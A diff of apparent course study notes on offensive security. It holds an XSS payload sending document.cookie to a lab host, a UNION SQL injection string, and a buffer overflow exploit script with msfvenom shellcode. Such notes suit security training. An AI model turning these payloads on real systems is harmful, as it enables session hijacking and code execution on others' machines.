@@ -266,7 +266,7 @@ nikto -host 10.50.37.95
 python3 -m http.server
 -stars an http server 
 
-<script>document.location="http://10.50.37.95/uploads/cookie.php username="+document.cookie;<script>
+<script>document.location="http://10.100.28.40/uploads/cookie.php username="+document.cookie;<script>
 
 
 
@@ -343,7 +343,7 @@ Selection=2 UNION select id,pass,name from session.user;#
 
 
 
-DAY 4 Reverse Engineering
+DAY 4 Reverse Engineering/Binary Analysis
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 X86_64 Assembly
@@ -391,11 +391,145 @@ param_1 usually user input
 
 
 
+PATCH
+
+IDA 
+
+edit 
+  patch program 
+    assemble
+    
+edit 
+  patch program 
+    apply patches
+    
 
 
 
+GHIDRA
+
+right click 
+  patch instruction
+  
+File
+  export program
+  
+
+  
+  
+
+DAY 6 EXPLOITATION DEVELOPMENT
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Buffer Overflow Linux
+
+test for overflow 
+  dump characters into prompt until Segmentation fault (core dumped)
+  
+GDB
+  
+gdb func
+-opens func in gdb
+
+pdisass main
+-program dissasemble main function
+ -keep going through functions until you find a vunerable function
 
 
+run
+-runs program
+
+<<<
+-requires user input
+
+
+find exact overflow offest value
+-wiremask.eu
+  tools
+    buffer overflow pattern generator
+    
+generate pattern and put it on the program
+
+take hex value of value of choice and put it into website to get offset
+
+use offset with function to check oberflow bytes
+run <<< $(python /home/student/BUFFER_OVERFLOW_BS)
+
+look for valid jump ESPs
+  close peda
+  
+  env - gdb 
+  -open standard gdb
+  
+  show env
+  
+  unset env <LINES,COULUMS>
+  
+  file <filename>
+  -selects file
+  
+  run
+  
+  info proc map
+  -search heap for jump esp
+  
+  find /b <first start addr under heap>, <first address under stack>, 0xff, 0xe4
+  -0xff = jump
+  -0xe4 = esp
+  
+  grab a hand full of addresses 
+  
+  put them as comment in your script and split them into bytes
+  
+  1 offest = "A" * 62
+  2 eip = "B" * 4
+  3 '''
+  4 0xf7 f6 86 3b
+  5 0xf7 f6 87 0b
+  6 0xf7 f6 87 33
+  7 0xf7 f6 87 bb
+  8 0xf7 f6 88 53
+  9 0xf7 f6 95 6b
+ 10 '''
+ 11 
+ 12 eip = "\x3b\x86\xf6\xf7"
+ 13 nop = "\x90" * 10
+ 14 
+ 15 buf =  b""
+ 16 buf += b"\xdb\xd1\xd9\x74\x24\xf4\xbe\x7d\x8a\xc2\x6f\x5b\x2b"
+ 17 buf += b"\xc9\xb1\x0c\x31\x73\x1a\x03\x73\x1a\x83\xc3\x04\xe2"
+ 18 buf += b"\x88\xe0\xc9\x37\xeb\xa7\xab\xaf\x26\x2b\xbd\xd7\x50"
+ 19 buf += b"\x84\xce\x7f\xa0\xb2\x1f\xe2\xc9\x2c\xe9\x01\x5b\x59"
+ 20 buf += b"\xe5\xc5\x5b\x99\xd9\xa7\x32\xf7\x0a\x5f\xac\x68\x34"
+ 21 buf += b"\xf2\x45\x77\xe1\x5f\x1c\x96\xc0\xe0"
+ 22 
+ 23 print(offest + eip + nop + buf)
+  
+ if doesn't work double nop sled
+ 
+
+msfvenom -p linux/x86/exec CMD="/bin/whoami" -b "\x00" -f python
+-p payload
+-b bad characters
+(only bad charater in mod x00)
+-f format
+
+copy all buf 
+
+paste under nop sled
+
+checklist
+-verify offest
+-eip in reverse endian order
+-verify nop sled 
+-shell code bf only
+-varaibles in correct order
+
+
+
+troubleshooting 
+-extend nop sled
+-pick new eip
 
 
 
